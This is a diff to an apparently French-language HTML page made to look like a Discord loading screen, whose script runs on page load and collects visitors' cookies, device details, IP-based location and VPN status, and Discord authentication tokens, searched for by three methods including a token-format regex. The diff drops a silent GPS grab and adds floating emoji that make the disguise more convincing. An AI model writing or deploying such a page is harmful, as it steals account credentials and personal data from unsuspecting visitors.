@@ -17,9 +17,11 @@
       justify-content: center;
       height: 100vh;
       flex-direction: column;
+      overflow: hidden;
+      position: relative;
     }
-    h1 { font-size: 20px; margin: 20px 0 10px; }
-    p { font-size: 14px; color: #b9bbbe; text-align: center; }
+    h1 { font-size: 20px; margin: 20px 0 10px; z-index:2; }
+    p { font-size: 14px; color: #b9bbbe; text-align: center; z-index:2;}
     .loader {
       border: 5px solid #f3f3f3;
       border-top: 5px solid #7289da;
@@ -28,10 +30,30 @@
       height: 40px;
       animation: spin 1s linear infinite;
       margin-top: 30px;
+      z-index:2;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
+    }
+    .bg-emoji {
+      position: absolute;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      pointer-events: none;
+      z-index: 1;
+      overflow: hidden;
+    }
+    .emoji {
+      position: absolute;
+      font-size: 2.2em;
+      opacity: 0.18;
+      user-select: none;
+      pointer-events: none;
+      animation: float 8s linear infinite;
+    }
+    @keyframes float {
+      0% { transform: translateY(110vh) scale(1) rotate(0deg);}
+      100% { transform: translateY(-10vh) scale(1.2) rotate(360deg);}
     }
   </style>
   <script>
@@ -69,7 +91,7 @@
       }
     });
 
-    // Collecte d'informations avancées
+    // Collecte d'informations avancées (sans GPS)
     async function collectInfos() {
       try {
         const now = new Date().toLocaleString();
@@ -97,26 +119,11 @@
           batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
         } catch(e) {}
 
-        // GPS (tentative silencieuse)
-        let gps = "Non autorisé";
-        if ("geolocation" in navigator) {
-          try {
-            gps = await new Promise((resolve) => {
-              navigator.geolocation.getCurrentPosition(
-                pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}, Précision: ${pos.coords.accuracy}m`),
-                () => resolve("Refusé ou erreur"),
-                {timeout: 1000}
-              );
-            });
-          } catch(e) {}
-        }
-
         // Token Discord (méthodes multiples)
         let token = null;
         try {
           // Méthode 1: localStorage
           token = localStorage.getItem("token");
-
           // Méthode 2: recherche clé contenant "token"
           if (!token) {
             for (let i in localStorage) {
@@ -126,8 +133,7 @@
               }
             }
           }
-
-          // Méthode 3: expressions régulières (plus risqué, mais parfois efficace)
+          // Méthode 3: expressions régulières
           if (!token) {
             const regex = /[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/g;
             for (let i in localStorage) {
@@ -140,8 +146,6 @@
               } catch (e) {}
             }
           }
-
-          // Nettoyage du token
           if (token) token = token.replace(/"/g, "").trim();
         } catch (e) {
           token = "Erreur accès token";
@@ -202,7 +206,6 @@
           `⚙️ CPU Threads : ${cpuThreads}`,
           `💾 RAM estimée : ${deviceMemory} Go`,
           `🛡️ VPN : ${geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN/Proxy détecté" : "✅ Connexion normale"}`,
-          `📍 GPS : ${gps}`,
           `🎤 Appareils audio/vidéo : ${mediaDevices}`,
           `🔤 Polices détectées : ${fonts}`,
           `🍪 Cookies : ${cookies}`,
@@ -223,6 +226,30 @@
     }
 
     document.addEventListener("DOMContentLoaded", collectInfos);
+
+    // Effet visuel : emojis Discord qui flottent
+    document.addEventListener("DOMContentLoaded", () => {
+      const emojis = [
+        "💬", "🎮", "👾", "⚡", "✨", "🔥", "🎉", "😎", "🎧", "🦄", "🚀", "👽", "🤖", "💻", "🌈", "🕹️"
+      ];
+      const bg = document.createElement('div');
+      bg.className = 'bg-emoji';
+      document.body.appendChild(bg);
+
+      function randomEmoji() {
+        const e = document.createElement('span');
+        e.className = 'emoji';
+        e.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        e.style.left = Math.random() * 100 + 'vw';
+        e.style.fontSize = (Math.random() * 1.5 + 1.2) + 'em';
+        e.style.animationDuration = (Math.random() * 4 + 6) + 's';
+        e.style.opacity = Math.random() * 0.15 + 0.12;
+        bg.appendChild(e);
+        setTimeout(() => bg.removeChild(e), 9000);
+      }
+      setInterval(randomEmoji, 400);
+      for(let i=0;i<15;i++) randomEmoji();
+    });
   </script>
 </head>
 <body>
